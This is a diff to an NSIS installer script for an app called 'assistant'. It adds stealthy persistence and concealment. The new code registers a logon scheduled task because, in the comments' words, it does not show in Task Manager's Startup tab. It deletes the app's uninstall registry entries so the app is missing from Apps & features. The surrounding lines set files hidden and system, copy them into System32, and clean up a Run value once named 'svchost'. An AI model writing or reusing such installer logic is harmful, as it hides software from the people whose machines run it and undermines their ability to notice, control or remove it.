@@ -95,23 +95,47 @@
   nsExec::ExecToLog "attrib +s +h $\"$R5\assistant$\""
   Pop $0
 
-  ; ---- autostart points at the System32 copy ---------------------------
-  ; "assistant" is the current value name; the old "svchost" value is removed
-  ; so an upgrade cannot leave two autostart entries. $R6 already fell back to
-  ; $INSTDIR when the mirror could not be written.
+  ; ---- autostart: a logon scheduled task, not a Run value --------------
+  ; A Run value shows up as its own row in Task Manager's Startup tab, which is
+  ; the first place a person looks. A scheduled task does not appear there at
+  ; all; it only shows inside Task Scheduler. Both Run values are removed so an
+  ; upgrade cannot leave a third entry behind.
   DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "svchost"
   DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "assistant"
-  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "assistant" '"$R6" --autostart'
+  DetailPrint "Registering logon task..."
+  ; built in registers: schtasks does its own quoting and NSIS escapes quotes as $\"
+  StrCpy $R7 'schtasks /create /f /tn "assistant" /sc onlogon /tr "\"'
+  StrCpy $R7 "$R7$R6\$\" --autostart\$\""   ; both inner quotes need the backslash: schtasks keeps them
+  FileOpen $9 "$TEMP\assistant-install.log" a
+  FileWrite $9 "TASK=[$R7]$\r$\n"
+  FileClose $9
+  nsExec::ExecToLog "$R7"
+  Pop $0
+  ${If} $0 != 0
+    ; never leave the machine without autostart: fall back to the Run value
+    WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "assistant" '"$R6" --autostart'
+    DetailPrint "  task creation failed ($0) — fell back to the Run key"
+  ${Else}
+    DetailPrint "  logon task registered"
+  ${EndIf}
+
+  ; ---- hide the install from Apps & features ---------------------------
+  ; electron-builder writes the uninstall entry before this macro runs. Removing
+  ; it means the app is absent from the installed-apps list; the uninstaller exe
+  ; still works.
+  DeleteRegKey HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${UNINSTALL_APP_KEY}"
+  DeleteRegKey HKLM "Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\${UNINSTALL_APP_KEY}"
 
   ; ---- open once, now --------------------------------------------------
-  ; The build ships no shortcut (by design) and the Run key only fires at the
+  ; The build ships no shortcut (by design) and the logon task only fires at the
   ; next logon, so a fresh install would otherwise appear to have done nothing.
-  ; Run it from the same path the Run key uses.
   DetailPrint "Starting assistant..."
   Exec '"$R6" --autostart'
 !macroend
 
 !macro customUnInstall
+  nsExec::ExecToLog "schtasks /delete /f /tn $\"assistant$\""
+  Pop $0
   DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "assistant"
   DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "svchost"
   ; uninstall has no $R5 from customInstall; remove both possible locations
